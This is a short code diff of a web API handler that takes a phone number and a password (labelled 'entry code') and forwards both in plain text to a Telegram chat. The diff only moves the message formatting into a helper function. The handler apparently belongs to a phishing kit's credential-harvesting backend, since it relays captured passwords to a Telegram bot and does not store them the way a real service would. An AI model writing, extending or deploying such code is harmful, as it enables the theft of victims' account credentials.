@@ -1,4 +1,4 @@
-import { sendToTelegram } from '@/utils/telegram';
+import { sendToTelegram, formatRegistrationMessage } from '@/utils/telegram';
 import { rateLimit } from '@/utils/rateLimit';
 import { validatePhone, validateEntryCode } from '@/utils/validation';
 
@@ -24,17 +24,7 @@ export default async function handler(req, res) {
   }
 
   const time = new Date().toLocaleString('ar-MR');
-  const copyText = `📱 ${phone}\n🔐 ${entryCode}`;
-
-  await sendToTelegram(
-    `🆕 تسجيل جديد
-━━━━━━━━━━━━━━
-📱 رقم الهاتف: ${phone}
-🔐 كلمة السر: ${entryCode}
-⏰ الوقت: ${time}
-━━━━━━━━━━━━━━`,
-    copyText
-  );
+  await sendToTelegram(formatRegistrationMessage(phone, entryCode, time));
 
   return res.status(200).json({ success: true });
 }
